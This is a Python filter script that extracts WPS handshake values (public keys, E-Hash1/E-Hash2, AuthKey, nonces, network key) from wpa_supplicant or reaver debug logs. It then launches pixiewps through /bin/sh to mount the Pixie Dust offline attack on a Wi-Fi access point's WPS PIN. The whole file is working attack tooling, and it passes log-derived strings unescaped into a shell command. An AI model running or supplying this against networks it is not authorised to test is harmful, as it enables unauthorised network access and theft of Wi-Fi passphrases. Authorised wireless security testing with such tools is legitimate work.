#!/usr/bin/env python

# this is a filter meant to be used with a logfile containing
# debug output from wpa_supplicant or reaver, which extracts
# cryptographic values of interest and tries to run pixiewps
# with them. input is passed on stdin.

import sys, os

class Data():
	def __init__(self):
		self.pke = ''
		self.pkr = ''
		self.e_hash1 = ''
		self.e_hash2 = ''
		self.authkey = ''
		self.e_nonce = ''
		self.e_snonce1 = ''
		self.e_snonce2 = ''
		self.wpa_psk = ''

	def __repr__(self):
		return \
			"pke = " + self.pke + "\n" \
			"pkr = " + self.pkr + "\n" \
			"e_hash1 = " + self.e_hash1 + "\n" \
			"e_hash2 = " + self.e_hash2 + "\n" \
			"authkey = " + self.authkey + "\n" \
			"e_nonce = " + self.e_nonce + "\n" \
			"e_snonce1 = " + self.e_snonce1 + "\n" \
			"e_snonce2 = " + self.e_snonce2 + "\n" \
			"wpa_psk = " + self.wpa_psk + "\n"

def process_wpa_supplicant_line(data, line):
	def get_hex(line):
		a = line.split(':', 3)
		return a[2].replace(' ', '')

	if line.startswith('WPS: '):
		if 'Enrollee Nonce' in line and 'hexdump' in line:
			data.e_nonce = get_hex(line)
			assert(len(data.e_nonce) == 16*2)
		elif 'DH own Public Key' in line and 'hexdump' in line:
			data.pkr = get_hex(line)
			assert(len(data.pkr) == 192*2)
		elif 'DH peer Public Key' in line and 'hexdump' in line:
			data.pke = get_hex(line)
			assert(len(data.pke) == 192*2)
		elif 'AuthKey' in line and 'hexdump' in line:
			data.authkey = get_hex(line)
			assert(len(data.authkey) == 32*2)
		elif 'E-Hash1' in line and 'hexdump' in line:
			data.e_hash1 = get_hex(line)
			assert(len(data.e_hash1) == 32*2)
		elif 'E-Hash2' in line and 'hexdump' in line:
			data.e_hash2 = get_hex(line)
			assert(len(data.e_hash2) == 32*2)
		elif 'Network Key' in line and 'hexdump' in line:
			data.wpa_psk = get_hex(line).decode('hex')
		elif 'E-SNonce1' in line and 'hexdump' in line:
			data.e_snonce1 = get_hex(line)
			assert(len(data.e_snonce1) == 16*2)
		elif 'E-SNonce2' in line and 'hexdump' in line:
			data.e_snonce2 = get_hex(line)
			assert(len(data.e_snonce2) == 16*2)

def got_all_pixie_data(data):
	return data.pke and data.pkr and data.e_nonce and data.authkey and data.e_hash1 and data.e_hash2

def get_pixie_cmd(data):
	return "pixiewps --pke %s --pkr %s --e-hash1 %s --e-hash2 %s --authkey %s --e-nonce %s" % \
		(data.pke, data.pkr, data.e_hash1, data.e_hash2, data.authkey, data.e_nonce)

if __name__ == '__main__':

	data = Data()

	while True:
		line = sys.stdin.readline()
		if line == '': break
		process_wpa_supplicant_line(data, line.rstrip('\n'))

	print(data)

	if got_all_pixie_data(data):
		pixiecmd = get_pixie_cmd(data)

		print(("running %s" % pixiecmd))
		os.execlp('/bin/sh', '/bin/sh', '-c', pixiecmd)

